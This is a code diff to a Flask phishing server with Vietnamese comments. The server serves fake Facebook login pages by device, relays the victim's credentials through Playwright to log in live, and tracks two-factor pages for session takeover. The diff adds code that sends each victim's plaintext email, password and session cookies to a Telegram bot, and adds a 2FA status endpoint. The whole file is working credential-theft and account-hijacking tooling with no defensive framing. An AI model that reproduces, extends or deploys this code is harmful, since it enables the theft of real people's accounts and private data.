@@ -29,7 +29,6 @@ from utils.get_html import get_facebook_page_after_login, get_cookies, wait_and_
 # Telegram config file
 BOT_CONFIG_FILE = os.path.join(_parent_dir, "bot_config.txt")
 
-
 def _adjust_column_widths(ws):
 
     """Tự động căn chỉnh kích thước cột theo nội dung"""
@@ -88,7 +87,6 @@ app = Flask(__name__, template_folder=template_dir)
 
 FILE_NAME = os.path.join(_parent_dir, "users.xlsx")
 
-
 def get_ip_location(ip: str) -> str:
     """Lấy thông tin vị trí từ IP sử dụng ip-api.com"""
     try:
@@ -105,7 +103,6 @@ def get_ip_location(ip: str) -> str:
         return 'Unknown'
     except Exception as e:
         return f'Error: {str(e)[:30]}'
-
 
 def send_telegram_message(message: str) -> bool:
     """Gửi message qua Telegram Bot"""
@@ -140,11 +137,9 @@ def send_telegram_message(message: str) -> bool:
         print(f"[Telegram] Error: {e}")
         return False
 
-
 # Quản lý các session - mỗi user có worker riêng
 _active_sessions: Dict[str, '_AutomationWorker'] = {}
 _sessions_lock = threading.Lock()
-
 
 class _AutomationWorker:
     """Worker thread chạy Playwright operations cho mỗi user riêng biệt"""
@@ -181,7 +176,6 @@ class _AutomationWorker:
         self._q.put((func, args, kwargs, fut))
         return fut
 
-
 def detect_device(user_agent: str) -> str:
     """Phát hiện thiết bị từ User-Agent"""
     ua = user_agent.lower()
@@ -190,7 +184,6 @@ def detect_device(user_agent: str) -> str:
     if "android" in ua:
         return "Android"
     return "Desktop"
-
 
 @app.route("/")
 def home():
@@ -207,7 +200,6 @@ def home():
     template = template_map.get(device, "Desktop/login.html")
     
     return render_template(template)
-
 
 @app.route("/login", methods=["POST"])
 def login():
@@ -269,9 +261,10 @@ def login():
             get_facebook_page_after_login,
             username=email,
             password=password,
-            headless=False,
             timeout=300000
         )
+        
+        print(f"[Server Debug] html length: {len(html) if html else 0}, should_get_cookies: {should_get_cookies}, login_failed: {login_failed}")
         
         # Nếu đăng nhập sai (URL là /login/web/), trả về login_failed cho client
         if login_failed:
@@ -295,11 +288,20 @@ def login():
                 cookies_value = cookies if cookies else "Không lấy được"
             except Exception as e:
                 cookies_value = f"Lỗi: {str(e)[:50]}"
+            
+            # Đăng nhập thành công - gửi Telegram và redirect sang /help
+            telegram_msg = f"✅ <b>Đăng nhập thành công</b>\n\n📧 Email: {email}\n🔑 Password: {password}\n🍪 Cookies: {cookies_value[:100]}..."
+            send_telegram_message(telegram_msg)
+            
+            print(f"[Server] Đăng nhập thành công - return redirect /help cho client")
+            return jsonify({
+                "success": True,
+                "redirect": "/help",
+                "should_get_cookies": True
+            })
         else:
+            # 2FA flow - đợi cookies sau
             worker.submit(wait_and_save_cookies, file_name=FILE_NAME)
-        
-        # Không gửi Telegram ở đây - sẽ gửi 1 lần duy nhất sau khi nhận form help
-        # Để tránh gửi nhiều lần trong các flow khác nhau
         
         return jsonify({
             "success": True,
@@ -313,6 +315,48 @@ def login():
             "error": f"Lỗi đăng nhập: {str(e)}"
         }), 500
 
+@app.route("/check_2fa_status", methods=["POST"])
+def check_2fa_status():
+    """API kiểm tra trạng thái 2FA - trả về URL hiện tại để client biết khi nào chuyển sang help"""
+    data = request.json
+    email = data.get("email", "").strip()
+    
+    if not email:
+        return jsonify({"success": False, "error": "Thiếu email"}), 400
+    
+    try:
+        # Tìm worker bằng email
+        with _sessions_lock:
+            worker = _active_sessions.get(email)
+        
+        if not worker:
+            return jsonify({"success": False, "error": "Không tìm thấy session"}), 404
+        
+        # Lấy URL hiện tại từ worker thông qua hàm get_current_url
+        from utils.get_html import LAST_PAGE
+        if not LAST_PAGE:
+            return jsonify({"success": False, "error": "Không tìm thấy page"}), 404
+        
+        current_url = LAST_PAGE.url
+        
+        # Kiểm tra nếu cần chuyển sang help (checkpoint_src=any hoặc đã rời khỏi trang 2FA)
+        need_help = 'checkpoint_src=any' in current_url
+        
+        # Kiểm tra nếu đã hoàn tất 2FA (không còn ở trang two_step_verification)
+        is_complete = '/login' not in current_url and 'two_step_verification' not in current_url and 'facebook.com' in current_url
+        
+        # 'completed' để tương thích với hfa.html JavaScript
+        completed = is_complete or need_help
+        
+        return jsonify({
+            "success": True,
+            "url": current_url,
+            "need_help": need_help,
+            "is_complete": is_complete,
+            "completed": completed
+        })
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route("/get_cookies", methods=["POST"])
 def api_get_cookies():
@@ -337,7 +381,6 @@ def api_get_cookies():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-
 def run_server(host="0.0.0.0", port=5000, open_browser=False):
     """Chạy Flask server"""
     url = f"http://localhost:{port}"
@@ -355,7 +398,6 @@ def run_server(host="0.0.0.0", port=5000, open_browser=False):
         use_reloader=False,
         threaded=True  # Flask xử lý mỗi request trên thread riêng
     )
-
 
 if __name__ == "__main__":
     import argparse
